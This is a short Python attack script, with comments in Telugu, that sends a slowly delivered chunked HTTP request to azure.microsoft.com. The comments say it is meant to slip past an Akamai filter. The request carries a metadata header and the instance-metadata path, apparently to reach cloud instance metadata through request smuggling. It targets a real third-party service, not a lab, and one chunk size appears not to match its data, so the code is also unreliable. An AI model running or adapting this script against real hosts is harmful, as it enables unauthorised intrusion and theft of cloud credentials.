import socket
import ssl
import time

host = "azure.microsoft.com"
port = 443

# 2030 Chunked Delay Smuggling
# డేటాని ముక్కలుగా పంపి Akamai ఫిల్టర్ ని తప్పిద్దాం
payload_chunks = [
    b"POST /en-us/ HTTP/1.1\r\n",
    b"Host: azure.microsoft.com\r\n",
    b"Transfer-Encoding: chunked\r\n",
    b"Metadata: true\r\n",
    b"Connection: keep-alive\r\n\r\n",
    b"5\r\n", b"url=/\r\n",
    b"23\r\n", b"metadata/instance?api-version=2021-02-01\r\n",
    b"0\r\n\r\n"
]

context = ssl.create_default_context()
try:
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"🚀 Deploying Delayed Chunked Attack...")
            for chunk in payload_chunks:
                ssock.sendall(chunk)
                time.sleep(0.5) # చిన్న గ్యాప్ ఇస్తున్నాం
            
            res = b""
            ssock.settimeout(10)
            while True:
                try:
                    data = ssock.recv(4096)
                    if not data: break
                    res += data
                except: break
            
            print("\n📥 Response Received:")
            print(res.decode(errors='ignore'))
except Exception as e:
    print(f"❌ Error: {e}")
